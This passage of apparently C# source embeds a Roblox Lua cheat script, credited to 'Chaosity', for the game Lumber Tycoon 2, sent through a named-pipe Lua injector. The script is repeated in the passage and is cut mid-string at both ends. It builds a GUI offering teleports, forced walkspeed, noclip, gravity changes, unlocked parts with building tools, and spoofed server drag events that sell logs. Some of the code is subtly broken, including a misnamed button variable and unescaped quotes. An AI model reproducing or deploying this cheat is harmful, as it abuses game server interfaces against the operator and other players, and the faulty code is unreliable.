Color3.new(0.776471, 0, 0)\nTPPLOT.Position = UDim2.new(0.0199999996, 0, 0.870000005, 0)\nTPPLOT.Size = UDim2.new(0, 210, 0, 30)\nTPPLOT.Font = Enum.Font.Cartoon\nTPPLOT.Text = 'Teleport To Your Plot'\nTPPLOT.TextColor3 = Color3.new(0, 0, 0)\nTPPLOT.TextScaled = true\nTPPLOT.TextSize = 14\nTPPLOT.TextWrapped = true\nTPPLOT.MouseButton1Down:connect(function()\n\tfor i, v in pairs(game.Workspace.Properties:GetChildren()) do\n\t\tif v.Owner.Value == game.Players.LocalPlayer then\n\t\t\tgame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame\n\t\tend\n\tend\nend)\nBringWood.Name = 'BringWood'\nBringWood.Parent = Main\nBringWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBringWood.Position = UDim2.new(0.539166689, 0, 0.589999974, 0)\nBringWood.Size = UDim2.new(0, 100, 0, 30)\nBringWood.Font = Enum.Font.Cartoon\nBringWood.Text = 'Bring Wood'\nBringWood.TextColor3 = Color3.new(0, 0, 0)\nBringWood.TextScaled = true\nBringWood.TextSize = 14\nBringWood.TextWrapped = true\nBringWood.MouseButton1Down:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') and Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\tLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 10, 0))\n\t\tend\n\tend\nend)\nBSellChoppedWood.Name = 'BSellChoppedWood'\nBSellChoppedWood.Parent = Main\nBSellChoppedWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBSellChoppedWood.Position = UDim2.new(0.539166689, 0, 0.160000011, 0)\nBSellChoppedWood.Size = UDim2.new(0, 100, 0, 30)\nBSellChoppedWood.Font = Enum.Font.Cartoon\nBSellChoppedWood.Text = 'Sell Chopped Wood'\nBSellChoppedWood.TextColor3 = Color3.new(0, 0, 0)\nBSellChoppedWood.TextScaled = true\nBSellChoppedWood.TextSize = 14\nBSellChoppedWood.TextWrapped = true\nBSellChoppedWood.MouseButton1Click:connect(function()\n\t\tfor _, Log in pairs(workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\n\t\t\tif Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\t\tfor i,v in pairs(Log:GetChildren()) do\n\t\t\t\t\tif v.Name=='WoodSection' then\n\t\t\t\t\t\tspawn(function()\n\t\t\t\t\t\t\tfor i=1,10 do\n\t\t\t\t\t\t\t\twait()\n\t\t\t\t\t\t\t\tv.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)\n\t\t\t\t\t\t\tend\n\t\t\t\t\t\tend)\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\t\tspawn(function()\n\t\t\t\t\tfor i=1,20 do\n\t\t\t\t\t\twait()\n\t\t\t\t\t\tgame.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\tend\n\t\tend\n\tend\nend)\nBTPCutLogs.Name = 'BTPCutLogs'\nBTPCutLogs.Parent = Main\nBTPCutLogs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBTPCutLogs.Position = UDim2.new(0.539166689, 0, 0.306666672, 0)\nBTPCutLogs.Size = UDim2.new(0, 100, 0, 30)\nBTPCutLogs.Font = Enum.Font.Cartoon\nBTPCutLogs.Text = 'Teleport Cut Logs To You'\nBTPCutLogs.TextColor3 = Color3.new(0, 0, 0)\nBTPCutLogs.TextScaled = true\nBTPCutLogs.TextSize = 14\nBTPCutLogs.TextWrapped = true\nBTPCutLogs.MouseButton1Click:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\nif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\nif Log.Owner.Value == game.Players.LocalPlayer then\nLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 15, 0))\nend\nend\nend\nend)\nBPhantomWood.Name = 'BPhantomWood'\nBPhantomWood.Parent = Main\nBPhantomWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBPhantomWood.Position = UDim2.new(0.539166689, 0, 0.446666658, 0)\nBPhantomWood.Size = UDim2.new(0, 100, 0, 30)\nBPhantomWood.Font = Enum.Font.Cartoon\nBPhantomWood.Text = 'Teleport Cavecrawler Wood'\nBPhantomWood.TextColor3 = Color3.new(0, 0, 0)\nBPhantomWood.TextScaled = true\nBPhantomWood.TextSize = 14\nBPhantomWood.TextWrapped = true\nBPhantomWood.MouseButton1Down:connect(function()\nfor i, v in pairs(game.Workspace:GetChildren()) do\nif v.Name == 'TreeRegion' then\nfor a, b in pairs(v:GetChildren()) do\ntree(b, 'CaveCrawler')\nend\nend\nend\nend)\nTPNAME.Name = 'TPNAME'\nTPNAME.Parent = Main\nTPNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nTPNAME.BackgroundTransparency = 1\nTPNAME.Position = UDim2.new(0.0199999996, 0, 0, 0)\nTPNAME.Size = UDim2.new(0, 220, 0, 42)\nTPNAME.Font = Enum.Font.SourceSans\nTPNAME.Text = 'Teleports'\nTPNAME.TextColor3 = Color3.new(1, 1, 1)\nTPNAME.TextScaled = true\nTPNAME.TextSize = 14\nTPNAME.TextWrapped = true\n\nFUNCNAME.Name = 'FUNCNAME'\nFUNCNAME.Parent = Main\nFUNCNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nFUNCNAME.BackgroundTransparency = 1\nFUNCNAME.Position = UDim2.new(0.540000021, 0, 0, 0)\nFUNCNAME.Size = UDim2.new(0, 202, 0, 42)\nFUNCNAME.Font = Enum.Font.SourceSans\nFUNCNAME.Text = 'Functions'\nFUNCNAME.TextColor3 = Color3.new(1, 1, 1)\nFUNCNAME.TextScaled = true\nFUNCNAME.TextSize = 14\nFUNCNAME.TextWrapped = true\n\nBRejoinServer.Name = 'BRejoinServer'\nBRejoinServer.Parent = Main\nBRejoinServer.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBRejoinServer.Position = UDim2.new(0.540000021, 0, 0.733333349, 0)\nBRejoinServer.Size = UDim2.new(0, 207, 0, 30)\nBRejoinServer.Font = Enum.Font.Cartoon\nBRejoinServer.Text = 'Rejoin Server'\nBRejoinServer.TextColor3 = Color3.new(0, 0, 0)\nBRejoinServer.TextScaled = true\nBRejoinServer.TextSize = 14\nBRejoinServer.TextWrapped = true\nBRejoinServer.MouseButton1Down:connect(function()\nlocal placeId = 13822889\n\ngame:GetService('TeleportService'):Teleport(placeId)\nend)\nDISCO.Name = 'DISCO'\nDISCO.Parent = Main\nDISCO.BackgroundColor3 = Color3.new(1, 1, 1)\nDISCO.BackgroundTransparency = 1\nDISCO.Position = UDim2.new(0.540000021, 0, 0.850000024, 0)\nDISCO.Size = UDim2.new(0, 202, 0, 42)\nDISCO.Font = Enum.Font.SourceSans\nDISCO.Text = 'Made By Chaosity    Discord:  https://discord.gg/DEVYCQp'\nDISCO.TextColor3 = Color3.new(1, 1, 1)\nDISCO.TextScaled = true\nDISCO.TextSize = 14\nDISCO.TextWrapped = true\n\nWalkspeed.Name = 'Walkspeed'\nWalkspeed.Parent = Main\nWalkspeed.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWalkspeed.Position = UDim2.new(0.776944458, 0, 0.160000011, 0)\nWalkspeed.Size = UDim2.new(0, 100, 0, 30)\nWalkspeed.Font = Enum.Font.Cartoon\nWalkspeed.Text = 'Walkspeed[X]'\nWalkspeed.TextColor3 = Color3.new(0, 0, 0)\nWalkspeed.TextScaled = true\nWalkspeed.TextSize = 14\nWalkspeed.TextWrapped = true\nWalkspeed.MouseButton1Down:connect(function()\n\tlocal walkspeedplayer = game:GetService('Players').LocalPlayer\n\tlocal walkspeedmouse = walkspeedplayer:GetMouse()\n\t\n\tlocal walkspeedenabled = false\n\t\n\tfunction x_walkspeed(key)\n\t\tif (key == 'x') then\n\t\t\tif walkspeedenabled == false then\n\t\t\t\t_G.WS = 200;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = true\n\t\t\telseif walkspeedenabled == true then\n\t\t\t\t_G.WS = 20;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\twalkspeedmouse.KeyDown:connect(x_walkspeed)\n\t\nend)\nGravity.Name = 'Gravity'\nGravity.Parent = Main\nGravity.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nGravity.Position = UDim2.new(0.776944458, 0, 0.303333342, 0)\nGravity.Size = UDim2.new(0, 100, 0, 30)\nGravity.Font = Enum.Font.Cartoon\nGravity.Text = 'Gravity'\nGravity.TextColor3 = Color3.new(0, 0, 0)\nGravity.TextScaled = true\nGravity.TextSize = 14\nGravity.TextWrapped = true\nGravity.MouseButton1Down:connect(function()\nif Gravity == true then\nGravity = false\ngame.workspace.Gravity = 196.2\nelse\nGravity = true\ngame.workspace.Gravity = 45\nend\nend)\nBtools.Name = 'Btools'\nBtools.Parent = Main\nBtools.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBtools.Position = UDim2.new(0.776944458, 0, 0.443333328, 0)\nBtools.Size = UDim2.new(0, 100, 0, 30)\nBtools.Font = Enum.Font.Cartoon\nBtools.Text = 'Btools'\nBtools.TextColor3 = Color3.new(0, 0, 0)\nBtools.TextScaled = true\nBtools.TextSize = 14\nBtools.TextWrapped = true\nBTools.MouseButton1Down:connect(function()\n\tgame.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)\nfor index, child in pairs(game:GetService('Workspace'):GetChildren()) do\n   if child.ClassName == 'Part' then\n       child.Locked = false\n   end\n   if child.ClassName == 'MeshPart' then\n       child.Locked = false\n   end\n   if child.ClassName == 'UnionOperation' then\n       child.Locked = false\n   end\n   if child.ClassName == 'Model' then\n       for index, chil in pairs(child:GetChildren()) do\n           if chil.ClassName == 'Part' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'MeshPart' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'UnionOperation' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'Model' then\n               for index, childe in pairs(chil:GetChildren()) do\n                   if childe.ClassName == 'Part' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'MeshPart' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'UnionOperation' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'Model' then\n                       for index, childeo in pairs(childe:GetChildren()) do\n                           if childeo.ClassName == 'Part' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'MeshPart' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'UnionOperation' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'Model' then\n                           end\n                       end\n                   end\n               end\n           end\n       end\n   end\nend\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Hammer\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Clone\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Grab\nend)\nNoclip.Name = 'Noclip'\nNoclip.Parent = Main\nNoclip.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nNoclip.Position = UDim2.new(0.776944458, 0, 0.586666644, 0)\nNoclip.Size = UDim2.new(0, 100, 0, 30)\nNoclip.Font = Enum.Font.Cartoon\nNoclip.Text = 'Noclip [B]'\nNoclip.TextColor3 = Color3.new(0, 0, 0)\nNoclip.TextScaled = true\nNoclip.TextSize = 14\nNoclip.TextWrapped = true\nNoclip.MouseButton1Down:connect(function()\n\t\n\tlocal noclipplayer = game:GetService('Players').LocalPlayer\n\tlocal noclipmouse = noclipplayer:GetMouse()\n\t\n\tlocal donoclip = false\n\tlocal noclip = false\n\t\n\tfunction b_noclip(key)\n\t\tif (key == 'b') then\n\t\t\tif noclip == false then\n\t\t\t\tdonoclip = true\n\t\t\t\t\n\t\t\t\tnoclip = true\n\t\t\telseif noclip == true then\n\t\t\t\tdonoclip = false\n\t\t\t\t\n\t\t\t\tnoclip = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\tnoclipmouse.KeyDown:connect(b_noclip)\n\t\n\tgame:GetService('Players').LocalPlayer.Character.Head.Touched:connect(function(obj)\n\t\tif obj ~= workspace.Terrain then\n\t\t\tif donoclip == true then\n\t\t\t\tobj.CanCollide = false\n\t\t\telse\n\t\t\t\tobj.CanCollide = true\n\t\t\tend\n\t\tend\n\tend)\nend)\nOpen.Name = 'Open'\nOpen.Parent = LT2GUI1\nOpen.BackgroundColor3 = Color3.new(0.819608, 0, 0)\nOpen.Position = UDim2.new(0, 0, 0.699999988, 0)\nOpen.Size = UDim2.new(0, 100, 0, 50)\nOpen.Visible = false\nOpen.Font = Enum.Font.SourceSans\nOpen.Text = 'Open'\nOpen.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)\nOpen.TextScaled = true\nOpen.TextSize = 14\nOpen.TextWrapped = true\nOpen.MouseButton1Down:connect(function()\n    Open.Visible = false\n    Main.Visible = true\nend)\nend)\n");
      NamedPipes.LuaPipe("-- MADE BY Chaosity Chaosity\nspawn(function()\n\nlocal LT2GUI1 = Instance.new('ScreenGui')\nlocal Main = Instance.new('Frame')\nlocal TOPBAR = Instance.new('Frame')\nlocal Name = Instance.new('TextLabel')\nlocal EXIT = Instance.new('TextButton')\nlocal Cave = Instance.new('TextButton')\nlocal PalmIsland = Instance.new('TextButton')\nlocal Swamp = Instance.new('TextButton')\nlocal Volcano = Instance.new('TextButton')\nlocal LinkLogic = Instance.new('TextButton')\nlocal LandStore = Instance.new('TextButton')\nlocal BobShack = Instance.new('TextButton')\nlocal WoodRUs = Instance.new('TextButton')\nlocal Dock = Instance.new('TextButton')\nlocal BoxedCars = Instance.new('TextButton')\nlocal TPPLOT = Instance.new('TextButton')\nlocal BringWood = Instance.new('TextButton')\nlocal BSellChoppedWood = Instance.new('TextButton')\nlocal BTPCutLogs = Instance.new('TextButton')\nlocal BPhantomWood = Instance.new('TextButton')\nlocal TPNAME = Instance.new('TextLabel')\nlocal FUNCNAME = Instance.new('TextLabel')\nlocal BRejoinServer = Instance.new('TextButton')\nlocal DISCO = Instance.new('TextLabel')\nlocal Walkspeed = Instance.new('TextButton')\nlocal Gravity = Instance.new('TextButton')\nlocal Btools = Instance.new('TextButton')\nlocal Noclip = Instance.new('TextButton')\nlocal Open = Instance.new('TextButton')\n--Properties:\nLT2GUI1.Name = 'LT2GUI  1'\nLT2GUI1.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')\n\nMain.Name = 'Main'\nMain.Parent = LT2GUI1\nMain.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)\nMain.Position = UDim2.new(0.300000012, 0, 0.30399999, 0)\nMain.Size = UDim2.new(0, 450, 0, 300)\nMain.Active = true\nMain.Draggable = true\n\nTOPBAR.Name = 'TOPBAR'\nTOPBAR.Parent = Main\nTOPBAR.BackgroundColor3 = Color3.new(0.815686, 0, 0)\nTOPBAR.Position = UDim2.new(0, 0, -0.129999995, 0)\nTOPBAR.Size = UDim2.new(0, 450, 0, 39)\n\nName.Name = 'Name'\nName.Parent = TOPBAR\nName.BackgroundColor3 = Color3.new(1, 1, 1)\nName.BackgroundTransparency = 1\nName.Size = UDim2.new(0, 382, 0, 39)\nName.Font = Enum.Font.ArialBold\nName.Text = 'Lumber Tycoon 2  V1'\nName.TextColor3 = Color3.new(1, 1, 1)\nName.TextScaled = true\nName.TextSize = 14\nName.TextWrapped = true\n\nEXIT.Name = 'EXIT'\nEXIT.Parent = TOPBAR\nEXIT.BackgroundColor3 = Color3.new(1, 1, 1)\nEXIT.BackgroundTransparency = 1\nEXIT.Position = UDim2.new(0.892499983, 0, 0, 0)\nEXIT.Size = UDim2.new(0, 43, 0, 39)\nEXIT.Font = Enum.Font.SourceSans\nEXIT.Text = 'X'\nEXIT.TextColor3 = Color3.new(0, 0, 0)\nEXIT.TextScaled = true\nEXIT.TextSize = 14\nEXIT.TextWrapped = true\nEXIT.MouseButton1Down:connect(function()\n    Open.Visible = true\n    Main.Visible = false\nend)\nCave.Name = 'Cave'\nCave.Parent = Main\nCave.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nCave.Position = UDim2.new(0.0199999996, 0, 0.306666672, 0)\nCave.Size = UDim2.new(0, 100, 0, 30)\nCave.Font = Enum.Font.Cartoon\nCave.Text = 'Cave'\nCave.TextColor3 = Color3.new(0, 0, 0)\nCave.TextScaled = true\nCave.TextSize = 14\nCave.TextWrapped = true\nCave.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(3581, -179, 430))\nend)\nPalmIsland.Name = 'PalmIsland'\nPalmIsland.Parent = Main\nPalmIsland.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nPalmIsland.Position = UDim2.new(0.0199999996, 0, 0.163333341, 0)\nPalmIsland.Size = UDim2.new(0, 100, 0, 30)\nPalmIsland.Font = Enum.Font.Cartoon\nPalmIsland.Text = 'Palm Island'\nPalmIsland.TextColor3 = Color3.new(0, 0, 0)\nPalmIsland.TextScaled = true\nPalmIsland.TextSize = 14\nPalmIsland.TextWrapped = true\nPalmIsland.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(2549, -5, -42))\nend)\nSwamp.Name = 'Swamp'\nSwamp.Parent = Main\nSwamp.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nSwamp.Position = UDim2.new(0.0199999996, 0, 0.589999974, 0)\nSwamp.Size = UDim2.new(0, 100, 0, 30)\nSwamp.Font = Enum.Font.Cartoon\nSwamp.Text = 'Swamp'\nSwamp.TextColor3 = Color3.new(0, 0, 0)\nSwamp.TextScaled = true\nSwamp.TextSize = 14\nSwamp.TextWrapped = true\nSwamp.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1209, 132, -801))\nend)\nVolcano.Name = 'Volcano'\nVolcano.Parent = Main\nVolcano.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nVolcano.Position = UDim2.new(0.0199999996, 0, 0.446666658, 0)\nVolcano.Size = UDim2.new(0, 100, 0, 30)\nVolcano.Font = Enum.Font.Cartoon\nVolcano.Text = 'Volcano'\nVolcano.TextColor3 = Color3.new(0, 0, 0)\nVolcano.TextScaled = true\nVolcano.TextSize = 14\nVolcano.TextWrapped = true\nVolcano.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1585, 622, 1140))\nend)\nLinkLogic.Name = 'LinkLogic'\nLinkLogic.Parent = Main\nLinkLogic.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLinkLogic.Position = UDim2.new(0.264444441, 0, 0.303333342, 0)\nLinkLogic.Size = UDim2.new(0, 100, 0, 30)\nLinkLogic.Font = Enum.Font.Cartoon\nLinkLogic.Text = 'Link's Logic'\nLinkLogic.TextColor3 = Color3.new(0, 0, 0)\nLinkLogic.TextScaled = true\nLinkLogic.TextSize = 14\nLinkLogic.TextWrapped = true\nLinkLogic.TextWrapped = true\nLinkLogic.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(4605, 3, -727))\nend)\nLandStore.Name = 'LandStore'\nLandStore.Parent = Main\nLandStore.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLandStore.Position = UDim2.new(0.264444441, 0, 0.586666644, 0)\nLandStore.Size = UDim2.new(0, 100, 0, 30)\nLandStore.Font = Enum.Font.Cartoon\nLandStore.Text = 'Land Store'\nLandStore.TextColor3 = Color3.new(0, 0, 0)\nLandStore.TextScaled = true\nLandStore.TextSize = 14\nLandStore.TextWrapped = true\nLandStore.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(258, 3, -99))\nend)\nBobShack.Name = 'BobShack'\nBobShack.Parent = Main\nBobShack.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBobShack.Position = UDim2.new(0.264444441, 0, 0.160000011, 0)\nBobShack.Size = UDim2.new(0, 100, 0, 30)\nBobShack.Font = Enum.Font.Cartoon\nBobShack.Text = 'Bob's Shack'\nBobShack.TextColor3 = Color3.new(0, 0, 0)\nBobShack.TextScaled = true\nBobShack.TextSize = 14\nBobShack.TextWrapped = true\nBobShack.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(260, 8, -2542))\nend)\nWoodRUs.Name = 'WoodRUs'\nWoodRUs.Parent = Main\nWoodRUs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWoodRUs.Position = UDim2.new(0.264444441, 0, 0.443333328, 0)\nWoodRUs.Size = UDim2.new(0, 100, 0, 30)\nWoodRUs.Font = Enum.Font.Cartoon\nWoodRUs.Text = 'Wood R Us'\nWoodRUs.TextColor3 = Color3.new(0, 0, 0)\nWoodRUs.TextScaled = true\nWoodRUs.TextSize = 14\nWoodRUs.TextWrapped = true\nWoodRUs.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(265, 3, 57))\nend)\nDock.Name = 'Dock'\nDock.Parent = Main\nDock.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nDock.Position = UDim2.new(0.0199999996, 0, 0.73333329, 0)\nDock.Size = UDim2.new(0, 100, 0, 30)\nDock.Font = Enum.Font.Cartoon\nDock.Text = 'Dock'\nDock.TextColor3 = Color3.new(0, 0, 0)\nDock.TextScaled = true\nDock.TextSize = 14\nDock.TextWrapped = true\nDock.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(1114, -1, -197))\nend)\nBoxedCars.Name = 'BoxedCars'\nBoxedCars.Parent = Main\nBoxedCars.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBoxedCars.Position = UDim2.new(0.264444441, 0, 0.729999959, 0)\nBoxedCars.Size = UDim2.new(0, 100, 0, 30)\nBoxedCars.Font = Enum.Font.Cartoon\nBoxedCars.Text = 'Boxed Cars'\nBoxedCars.TextColor3 = Color3.new(0, 0, 0)\nBoxedCars.TextScaled = true\nBoxedCars.TextSize = 14\nBoxedCars.TextWrapped = true\nBoxedCars.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(509, 3, -1463))\nend)\nTPPLOT.Name = 'TPPLOT'\nTPPLOT.Parent = Main\nTPPLOT.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nTPPLOT.Position = UDim2.new(0.0199999996, 0, 0.870000005, 0)\nTPPLOT.Size = UDim2.new(0, 210, 0, 30)\nTPPLOT.Font = Enum.Font.Cartoon\nTPPLOT.Text = 'Teleport To Your Plot'\nTPPLOT.TextColor3 = Color3.new(0, 0, 0)\nTPPLOT.TextScaled = true\nTPPLOT.TextSize = 14\nTPPLOT.TextWrapped = true\nTPPLOT.MouseButton1Down:connect(function()\n\tfor i, v in pairs(game.Workspace.Properties:GetChildren()) do\n\t\tif v.Owner.Value == game.Players.LocalPlayer then\n\t\t\tgame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame\n\t\tend\n\tend\nend)\nBringWood.Name = 'BringWood'\nBringWood.Parent = Main\nBringWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBringWood.Position = UDim2.new(0.539166689, 0, 0.589999974, 0)\nBringWood.Size = UDim2.new(0, 100, 0, 30)\nBringWood.Font = Enum.Font.Cartoon\nBringWood.Text = 'Bring Wood'\nBringWood.TextColor3 = Color3.new(0, 0, 0)\nBringWood.TextScaled = true\nBringWood.TextSize = 14\nBringWood.TextWrapped = true\nBringWood.MouseButton1Down:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') and Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\tLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 10, 0))\n\t\tend\n\tend\nend)\nBSellChoppedWood.Name = 'BSellChoppedWood'\nBSellChoppedWood.Parent = Main\nBSellChoppedWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBSellChoppedWood.Position = UDim2.new(0.539166689, 0, 0.160000011, 0)\nBSellChoppedWood.Size = UDim2.new(0, 100, 0, 30)\nBSellChoppedWood.Font = Enum.Font.Cartoon\nBSellChoppedWood.Text = 'Sell Chopped Wood'\nBSellChoppedWood.TextColor3 = Color3.new(0, 0, 0)\nBSellChoppedWood.TextScaled = true\nBSellChoppedWood.TextSize = 14\nBSellChoppedWood.TextWrapped = true\nBSellChoppedWood.MouseButton1Click:connect(function()\n\t\tfor _, Log in pairs(workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\n\t\t\tif Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\t\tfor i,v in pairs(Log:GetChildren()) do\n\t\t\t\t\tif v.Name=='WoodSection' then\n\t\t\t\t\t\tspawn(function()\n\t\t\t\t\t\t\tfor i=1,10 do\n\t\t\t\t\t\t\t\twait()\n\t\t\t\t\t\t\t\tv.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)\n\t\t\t\t\t\t\tend\n\t\t\t\t\t\tend)\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\t\tspawn(function()\n\t\t\t\t\tfor i=1,20 do\n\t\t\t\t\t\twait()\n\t\t\t\t\t\tgame.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\tend\n\t\tend\n\tend\nend)\nBTPCutLogs.Name = 'BTPCutLogs'\nBTPCutLogs.Parent = Main\nBTPCutLogs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBTPCutLogs.Position = UDim2.new(0.539166689, 0, 0.306666672, 0)\nBTPCutLogs.Size = UDim2.new(0, 100, 0, 30)\nBTPCutLogs.Font = Enum.Font.Cartoon\nBTPCutLogs.Text = 'Teleport Cut Logs To You'\nBTPCutLogs.TextColor3 = Color3.new(0, 0, 0)\nBTPCutLogs.TextScaled = true\nBTPCutLogs.TextSize = 14\nBTPCutLogs.TextWrapped = true\nBTPCutLogs.MouseButton1Click:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\nif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\nif Log.Owner.Value == game.Players.LocalPlayer then\nLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 15, 0))\nend\nend\nend\nend)\nBPhantomWood.Name = 'BPhantomWood'\nBPhantomWood.Parent = Main\nBPhantomWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBPhantomWood.Position = UDim2.new(0.539166689, 0, 0.446666658, 0)\nBPhantomWood.Size = UDim2.new(0, 100, 0, 30)\nBPhantomWood.Font = Enum.Font.Cartoon\nBPhantomWood.Text = 'Teleport Cavecrawler Wood'\nBPhantomWood.TextColor3 = Color3.new(0, 0, 0)\nBPhantomWood.TextScaled = true\nBPhantomWood.TextSize = 14\nBPhantomWood.TextWrapped = true\nBPhantomWood.MouseButton1Down:connect(function()\nfor i, v in pairs(game.Workspace:GetChildren()) do\nif v.Name == 'TreeRegion' then\nfor a, b in pairs(v:GetChildren()) do\ntree(b, 'CaveCrawler')\nend\nend\nend\nend)\nTPNAME.Name = 'TPNAME'\nTPNAME.Parent = Main\nTPNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nTPNAME.BackgroundTransparency = 1\nTPNAME.Position = UDim2.new(0.0199999996, 0, 0, 0)\nTPNAME.Size = UDim2.new(0, 220, 0, 42)\nTPNAME.Font = Enum.Font.SourceSans\nTPNAME.Text = 'Teleports'\nTPNAME.TextColor3 = Color3.new(1, 1, 1)\nTPNAME.TextScaled = true\nTPNAME.TextSize = 14\nTPNAME.TextWrapped = true\n\nFUNCNAME.Name = 'FUNCNAME'\nFUNCNAME.Parent = Main\nFUNCNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nFUNCNAME.BackgroundTransparency = 1\nFUNCNAME.Position = UDim2.new(0.540000021, 0, 0, 0)\nFUNCNAME.Size = UDim2.new(0, 202, 0, 42)\nFUNCNAME.Font = Enum.Font.SourceSans\nFUNCNAME.Text = 'Functions'\nFUNCNAME.TextColor3 = Color3.new(1, 1, 1)\nFUNCNAME.TextScaled = true\nFUNCNAME.TextSize = 14\nFUNCNAME.TextWrapped = true\n\nBRejoinServer.Name = 